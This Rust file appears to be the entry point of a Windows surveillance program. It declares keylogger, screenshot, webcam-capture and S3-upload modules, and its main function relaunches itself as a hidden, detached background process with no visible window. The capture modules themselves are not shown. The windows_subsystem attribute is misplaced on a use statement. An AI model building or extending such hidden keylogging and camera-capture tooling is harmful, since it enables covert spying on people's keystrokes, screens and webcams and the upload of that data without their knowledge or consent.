use std::error::Error;
use std::process::Command;
use std::os::windows::process::CommandExt; // Import for creation_flags
use std::{env};
use std::sync::atomic::{AtomicBool};
use log::{error, info};
use anyhow::Result;
mod tasks;
mod process;
mod utils;
mod tracker;
mod keylogger;
mod screenshot;
mod camera_capture;
mod s3upload;
mod img;
mod screen;
mod cam;
mod logsetup;
mod orgdetails;
mod config;
mod awscnf;

use process::background::start_background_process;

#[windows_subsystem = "windows"]
use tokio;
use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
use crate::config::{ConfigAws, get_config_from_lambda, Task};
use crate::logsetup::logging::{initialize_logging};

#[cfg(windows)]
extern crate winapi;

// Global flag for process state
static RUNNING: AtomicBool = AtomicBool::new(true);

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    // Check if already running in background mode
    if env::args().any(|x| x == "--background") {
        // Initialize logging before starting background process
        let _handle = initialize_logging("config/config.toml")?;
        info!("Starting background process...");

        // Start the background process
        match start_background_process().await {
            Ok(_) => {
                info!("Background process completed successfully");
                Ok(())
            },
            Err(e) => {
                error!("Background process failed: {}", e);
                Err(e)
            }
        }
    } else {
        // This is the initial launch, spawn the background process
        let _handle = initialize_logging("config/config.toml")?;
        info!("Initial launch - spawning background process");

        let current_exe = env::current_exe()?;
        let mut command = Command::new(current_exe);
        command.arg("--background");

        // Set creation flags for Windows to hide the window
        command.creation_flags(CREATE_NO_WINDOW | DETACHED_PROCESS);

        match command.spawn() {
            Ok(_) => {
                info!("Background process spawned successfully. Exiting initial process.");
                std::process::exit(0);
                Ok(()) // Unreachable but needed for type checking
            }
            Err(e) => {
                error!("Failed to spawn background process: {}", e);
                Err(Box::new(e) as Box<dyn Error>) // Convert to Box<dyn Error>
            }
        }
    }
}